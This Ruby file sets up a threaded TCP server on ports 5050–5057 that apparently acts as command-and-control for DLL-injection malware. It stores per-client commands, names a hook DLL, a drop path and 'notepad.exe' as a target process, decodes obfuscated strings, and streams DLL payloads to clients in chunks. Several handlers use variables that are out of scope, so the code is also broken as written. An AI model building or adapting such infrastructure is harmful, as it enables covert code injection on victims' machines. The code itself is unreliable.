require 'socket'
require 'active_record'

def decode_anton(string)
	return(string.split('').map{|l| [(l.ord%256).chr, (l.ord/256).chr] }.join)
end

def local_ip
	UDPSocket.open {|s| s.connect('64.233.187.99', 1); s.addr.last }
end

server = local_ip
ports = (5050..5057).to_a
servers = ports.map { |p| TCPServer.new(server, p) }

ActiveRecord::Base.establish_connection({adapter: "sqlite3", database: "users.db"})

ActiveRecord::Schema.define do
	if !ActiveRecord::Schema.tables.include?("users")
		create_table :users do |table|
			table.column :name, :string
			table.column :command, :string
			table.column :mark, :string
			table.column :library, :string
			table.column :x, :string
			table.column :path, :string
			table.column :process, :string
		end
	end
end

class User < ActiveRecord::Base
end

@prepare = Proc.new do
	line = client.recv(1024)
	buf = line.encode("UTF-8", "Windows-1251")
	puts buf
	buf = buf.split("|")
end

methods = Array.new(ports.length)

methods[0] = lambda do |client|
	@prepare.call

	if buf[0] == "get"
		if User.find_by_name(buf[1]) == nil
			User.create!({
				name: buf[1], 
				command: "A0", 
				mark: "256", 
				library: "hookx64.dll", 
				x: "1", 
				path: "C:\\library1.dll",
				process: "notepad.exe"})
		end
		@user = User.find_by_name(buf[1])
		client.write(@user.command)
		@user.command = "A0"
		@user.save
	end
	client.close
end

methods[1] = lambda do |client|
	@prepare.call

	@u = User.find_by_name(buf[1])
	@file_name = @u.library

	if buf[2].to_i > 10
		if buf[2].to_i == 86
			@file_name = "msvcp140CBx86.dll"
		elsif buf[2].to_i == 64
			@file_name = "msvcp140CBx64.dll"
		end
	end

	if buf[0] == "getTPC"
		@file = File.open(@file_name, 'rb')
		@file_buffer = @file.read
		count = @file_buffer.length/1024
		residue = @file_buffer.length%1024
		answer = "#{@u.mark}##{@u.x}##{count}##{residue}#"
		client.write(answer)
	elsif buf[0] == "getP"
		path = decode_anton @u.path
		client.write("#{path.length/2}##{path}")
	elsif buf[0] == "getN"
		name = decode_anton @u.process
		client.write("#{name.length/2}##{name}")
	elsif buf[0] == "getPart"
		part = buf[3].to_i
		file_buffer = File.open(@file_name, 'rb').read
		count = file_buffer.length/1024
		current = count - part
		res = file_buffer[current*1024..(current+1)*1024] if part != 0
		res = file_buffer[count*1024..count*1024+file_buffer.length%1024] if part == 0
		client.write(res)
	end
	client.close
end

@pool = []

(0..10).each do |n|
	@pool.push("111.111.111.#{n.to_s*2}")
end

methods[2] = lambda do |client|
	@prepare.call

	client.write("#{@pool[buf[2].to_i]}\0")
end

methods[3] = lambda do |client|
	puts client.recv(1024)
end

methods[4] = lambda do |client|
	@prepare.call

	if buf[0] == "getTimeout"
		client.write("0")
	end
end

methods[5] = lambda do |client|
	@prepare.call

	if buf[0] == "getReady"
		client.write("yes")
	elsif buf[0] == "setP"
	end
end

methods[6] = lambda do |client|
	@prepare.call

	if buf[0] == "getReadyAI"
		client.write("yes")
	end
end

methods[7] = lambda do |client|
	@prepare.call

	if buf[0] == "getReadyI"
		client.write("yes")
	end
end

threads = servers.each_with_index.map do |srv, index|
	Thread.new do
		puts "Server #{srv.local_address.ip_address}:#{srv.local_address.ip_port} started"
		while client = srv.accept
			Thread.new { methods[index].call(client) }.join
		end
	end
end

threads.each { |t| t.join }